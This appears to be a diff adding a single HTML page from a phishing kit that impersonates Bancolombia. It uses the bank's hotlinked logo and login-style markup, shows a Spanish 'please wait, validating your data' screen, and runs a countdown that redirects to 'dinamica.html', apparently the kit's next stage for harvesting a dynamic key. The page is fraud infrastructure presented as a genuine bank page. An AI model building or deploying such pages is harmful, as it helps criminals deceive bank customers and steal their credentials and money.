@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html class="dkddl_fouc">
+  <head id="ctl00_Head1">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=10" />
+    <title>Bancolombia</title>
+    <link
+      href="./Bancolombia_files/Login.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script language="JavaScript">
+      /* Determinamos el tiempo total en segundos */
+      var totalTiempo = 30;
+
+      var url = "dinamica.html";
+
+      function updateReloj() {
+        document.getElementById("CuentaAtras").innerHTML =
+          "" + "0:" + totalTiempo + "";
+
+        if (totalTiempo == 0) {
+          window.location = url;
+        } else {
+          /* Restamos un segundo al tiempo restante */
+          totalTiempo -= 1;
+          /* Ejecutamos nuevamente la función al pasar 30000 milisegundos (30 segundo) */
+          setTimeout("updateReloj()", 800);
+        }
+      }
+
+      window.onload = updateReloj;
+    </script>
+  </head>
+
+  <body
+    style="
+      background-image: url('trazo3.svg');
+      background-attachment: fixed;
+      background-size: 100% 100%;
+    "
+  >
+    <form method="post" action="">
+      <style>
+        P.PanelControlTitleStyle {
+          font-family: verdana;
+          font-size: 12px;
+          font-weight: bold;
+          text-align: center;
+        }
+      </style>
+      <div class="contenedorgenerico">
+        <div class="login-container">
+          <div class="logo-ban" style="text-align: center">
+            <img
+              src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/08749bce-7395-4b19-b23c-e7fd93047a0a/logo-grupo-bancolombia.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_K9HC1202P864E0Q30449MS3000-08749bce-7395-4b19-b23c-e7fd93047a0a-nVP-YUW"
+              style="width: 201px"
+            /><br /><br /><br />
+          </div>
+          <div id="dimmer">
+            <div
+              id="ctl00_MainHolder_authenticate_firsStep_panel"
+              style="text-align: center; padding-top: 5px"
+            >
+              <div align="center">
+                <p style="font-size: 24px; color: black; margin: 40px">
+                  <strong>&iexcl;Por favor espere!</strong>
+                </p>
+                <br /><img
+                  style="font-weight: 900; width: 80px; height: auto"
+                  src="https://usagif.com/wp-content/uploads/loading-25.gif"
+                /><br /><strong
+                  ><span style="color: black; font-size: 16px" id="CuentaAtras"
+                    >0:30</span
+                  ><br /><span style="color: black; font-size: 16px"
+                    >No cierre esta ventana<br /><br />&nbsp;Estamos validando
+                    sus datos.</span
+                  ></strong
+                >
+                <div align="center"><br /></div>
+                <table
+                  class="tabla-login-teclado"
+                  cellpadding="0"
+                  cellspacing="0"
+                >
+                  <tbody>
+                    <tr>
+                      <td><br /></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </form>
+  </body>
+</html>
